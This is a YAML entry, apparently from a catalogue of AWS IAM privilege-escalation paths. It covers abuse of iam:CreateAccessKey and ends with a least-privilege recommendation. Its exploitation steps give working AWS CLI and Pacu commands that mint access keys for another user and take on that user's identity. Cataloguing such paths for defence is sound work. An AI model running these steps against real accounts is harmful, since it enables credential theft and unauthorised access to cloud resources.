id: iam-002
name: iam:CreateAccessKey
category: lateral-movement
services:
- iam
description: Anyone with access to `iam:CreateAccessKey` can create access keys for any user they have this permission on.
  This permission is often abused by one principal to gain access to another principal and the permissions associated with
  that principal.
prerequisites:
  admin:
  - Target user must have fewer than 2 access keys already
  - Target user must have administrative permissions (e.g., AdministratorAccess)
  lateral:
  - Target user must have fewer than 2 access keys already
exploitationSteps:
  awscli:
  - step: 1
    command: aws iam create-access-key --user-name @username
    description: Create a new access key for the target user
  - step: 2
    command: aws configure --profile target-user
    description: Configure AWS CLI with the newly created access key
  - step: 3
    command: aws sts get-caller-identity --profile target-user
    description: Verify access as the target user
  pacu:
  - step: 1
    command: run iam__enum_users_roles_policies_groups
    description: Enumerate IAM users to find target with fewer than 2 keys
  - step: 2
    command: run iam__create_access_key --user-name @username
    description: Create access key for target user and automatically configure profile
recommendation: |
  Restrict access to `iam:CreateAccessKey` using the principle of least privilege. Only allow
  users to create access keys for themselves or users they are authorized to manage. Very few
  principals need this permission on anyone other than themselves, so it should be restricted
  to only the few principals that need it.
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
relatedPaths:
- iam-003
- iam-004
- iam-006
toolSupport:
  pmapper: true
  iamVulnerable: true
permissions:
  required:
  - permission: iam:CreateAccessKey
    resourceConstraints: Target IAM user must be in the Resource section
  additional:
  - permission: iam:ListUsers
    resourceConstraints: Helpful for discovering target users
  - permission: iam:GetUser
    resourceConstraints: Useful for viewing user details
